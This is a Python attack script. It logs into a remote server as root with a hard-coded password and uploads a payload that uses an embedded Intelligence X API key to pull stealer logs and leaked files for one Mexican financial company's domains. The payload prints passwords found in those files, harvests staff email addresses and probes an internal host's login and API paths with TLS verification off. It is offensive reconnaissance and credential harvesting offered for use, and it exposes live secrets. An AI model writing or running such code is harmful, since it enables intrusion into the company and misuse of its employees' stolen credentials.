import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, json, sys, time
INTELX_KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
INTELX_URL = "https://2.intelx.io"
HEADERS = {"x-key": INTELX_KEY, "Content-Type": "application/json"}

# ========================================
# 1. FULL STEALER LOG SEARCH — file/read
# ========================================
sys.stdout.write("=" * 60 + "\n=== INTELX STEALER FILE READ ===\n" + "=" * 60 + "\n\n")

# Search for findep stealer logs
search_data = {
    "term": "findep.global",
    "buckets": ["leaks.logs"],
    "maxresults": 50,
    "media": 0,
    "sort": 4,  # Date desc
    "terminate": [],
}

r = requests.post(f"{INTELX_URL}/intelligent/search", json=search_data, headers=HEADERS, timeout=15)
search_id = r.json().get("id")
sys.stdout.write(f"Search ID: {search_id}\n\n")
time.sleep(3)

# Get results
r_results = requests.get(f"{INTELX_URL}/intelligent/search/result?id={search_id}&limit=50",
    headers=HEADERS, timeout=15)
results = r_results.json()
records = results.get("records", [])
sys.stdout.write(f"Results: {len(records)}\n\n")

for rec in records[:20]:
    name = rec.get("name", "?")
    sid = rec.get("systemid", "?")
    storageid = rec.get("storageid", "?")
    bucket = rec.get("bucket", "?")
    mediah = rec.get("mediah", "?")
    added = rec.get("added", "?")
    size = rec.get("size", 0)
    
    sys.stdout.write(f"  [{bucket}] {name[:70]} ({size}b) added={added[:10]}\n")
    sys.stdout.write(f"    systemid={sid} storageid={storageid}\n")
    
    # Try to read the file
    if size < 500000 and size > 0:  # Only read files < 500KB
        try:
            r_file = requests.get(f"{INTELX_URL}/file/read?type=0&storageid={storageid}&bucket={bucket}&f=0",
                headers=HEADERS, timeout=15)
            
            if r_file.status_code == 200 and len(r_file.text) > 10:
                content = r_file.text[:3000]
                # Look for passwords, URLs, credentials
                sys.stdout.write(f"    Content preview ({len(r_file.text)}b):\n")
                
                # Extract lines with findep
                for line in content.split('\n'):
                    if 'findep' in line.lower() or 'password' in line.lower() or 'pass:' in line.lower():
                        sys.stdout.write(f"      {line.strip()[:150]}\n")
                
                sys.stdout.write(f"    ---\n")
            else:
                sys.stdout.write(f"    Read: [{r_file.status_code}] ({len(r_file.text)}b)\n")
        except Exception as e:
            sys.stdout.write(f"    Read ERR: {str(e)[:60]}\n")
    
    sys.stdout.flush()


# ========================================
# 2. SEARCH FOR findep.com.mx STEALER LOGS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== FINDEP.COM.MX STEALER LOGS ===\n" + "=" * 60 + "\n\n")

search_data2 = {
    "term": "findep.com.mx",
    "buckets": ["leaks.logs"],
    "maxresults": 50,
    "media": 0,
    "sort": 4,
    "terminate": [],
}

r2 = requests.post(f"{INTELX_URL}/intelligent/search", json=search_data2, headers=HEADERS, timeout=15)
search_id2 = r2.json().get("id")
time.sleep(3)

r_results2 = requests.get(f"{INTELX_URL}/intelligent/search/result?id={search_id2}&limit=50",
    headers=HEADERS, timeout=15)
results2 = r_results2.json()
records2 = results2.get("records", [])
sys.stdout.write(f"Results: {len(records2)}\n\n")

for rec in records2[:20]:
    name = rec.get("name", "?")
    storageid = rec.get("storageid", "?")
    bucket = rec.get("bucket", "?")
    size = rec.get("size", 0)
    
    sys.stdout.write(f"  [{bucket}] {name[:70]} ({size}b)\n")
    
    if size < 500000 and size > 0:
        try:
            r_file = requests.get(f"{INTELX_URL}/file/read?type=0&storageid={storageid}&bucket={bucket}&f=0",
                headers=HEADERS, timeout=15)
            
            if r_file.status_code == 200 and len(r_file.text) > 10:
                for line in r_file.text[:5000].split('\n'):
                    if 'findep' in line.lower() or 'spei' in line.lower() or 'core.' in line.lower() or 'pao.' in line.lower() or 'sif.' in line.lower():
                        sys.stdout.write(f"    {line.strip()[:150]}\n")
        except:
            pass
    
    sys.stdout.flush()


# ========================================  
# 3. PHONEBOOK — ALL FINDEP EMAILS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PHONEBOOK findep.mx EMAILS ===\n" + "=" * 60 + "\n\n")

pb_data = {
    "term": "findep.mx",
    "maxresults": 100,
    "media": 0,
    "target": 1,  # Emails
    "terminate": [],
}

r_pb = requests.post(f"{INTELX_URL}/phonebook/search", json=pb_data, headers=HEADERS, timeout=15)
pb_id = r_pb.json().get("id")
time.sleep(2)

r_pb_results = requests.get(f"{INTELX_URL}/phonebook/search/result?id={pb_id}&limit=100",
    headers=HEADERS, timeout=15)
pb_results = r_pb_results.json()
selectors = pb_results.get("selectors", [])
sys.stdout.write(f"Emails found: {len(selectors)}\n\n")

for sel in selectors[:100]:
    sys.stdout.write(f"  {sel.get('selectorvalue', '?')}\n")
sys.stdout.flush()


# ========================================  
# 4. STEALER PRIVATE LEAKS — READ PASSWORDS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== PRIVATE LEAKS — ALL FINDEP PASSWORDS ===\n" + "=" * 60 + "\n\n")

# Search ULP/private leaks
for term in ["findep.global", "findep.com.mx", "findep.mx"]:
    search_data_priv = {
        "term": term,
        "buckets": ["leaks.private", "leaks.public"],
        "maxresults": 30,
        "media": 0,
        "sort": 4,
        "terminate": [],
    }
    
    r_priv = requests.post(f"{INTELX_URL}/intelligent/search", json=search_data_priv, headers=HEADERS, timeout=15)
    priv_id = r_priv.json().get("id")
    time.sleep(2)
    
    r_priv_results = requests.get(f"{INTELX_URL}/intelligent/search/result?id={priv_id}&limit=30",
        headers=HEADERS, timeout=15)
    priv_results = r_priv_results.json()
    priv_records = priv_results.get("records", [])
    
    sys.stdout.write(f"\n--- {term}: {len(priv_records)} private leak records ---\n")
    
    for rec in priv_records[:15]:
        name = rec.get("name", "?")
        storageid = rec.get("storageid", "?")
        bucket = rec.get("bucket", "?")
        size = rec.get("size", 0)
        
        if size < 500000 and size > 0:
            try:
                r_file = requests.get(f"{INTELX_URL}/file/read?type=0&storageid={storageid}&bucket={bucket}&f=0",
                    headers=HEADERS, timeout=15)
                
                if r_file.status_code == 200 and len(r_file.text) > 10:
                    for line in r_file.text[:10000].split('\n'):
                        if 'findep' in line.lower():
                            sys.stdout.write(f"  {line.strip()[:200]}\n")
            except:
                pass
    
    sys.stdout.flush()


# ========================================  
# 5. CHECK SIF.FINDEP.MX PROPERLY
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== SIF.FINDEP.MX DEEP PROBE ===\n" + "=" * 60 + "\n\n")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

try:
    r_sif = requests.get("https://sif.findep.mx/", verify=False, timeout=10, headers={"User-Agent": UA})
    sys.stdout.write(f"SIF root: [{r_sif.status_code}] ({len(r_sif.text)}b)\n")
    sys.stdout.write(f"Headers: {dict(r_sif.headers)}\n\n")
    sys.stdout.write(f"Body: {r_sif.text[:2000]}\n\n")
    
    # Probe common paths
    paths = ["/login", "/api", "/api/login", "/api/auth", "/api/v1", "/api/v2",
             "/auth", "/signin", "/Account/Login", "/Identity/Account/Login",
             "/swagger", "/api-docs", "/health", "/actuator", "/status",
             "/SIF", "/SIF/login", "/Home", "/Account"]
    
    for path in paths:
        try:
            r = requests.get(f"https://sif.findep.mx{path}", verify=False, timeout=5,
                            headers={"User-Agent": UA}, allow_redirects=False)
            if r.status_code not in [404, 503]:
                loc = r.headers.get("Location", "")
                sys.stdout.write(f"  [{r.status_code}] {path:<35} ({len(r.text)}b) {loc[:50]}\n")
        except:
            pass
    sys.stdout.flush()
except Exception as e:
    sys.stdout.write(f"SIF ERR: {str(e)[:80]}\n")


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_intelx_deep.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_intelx_deep.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
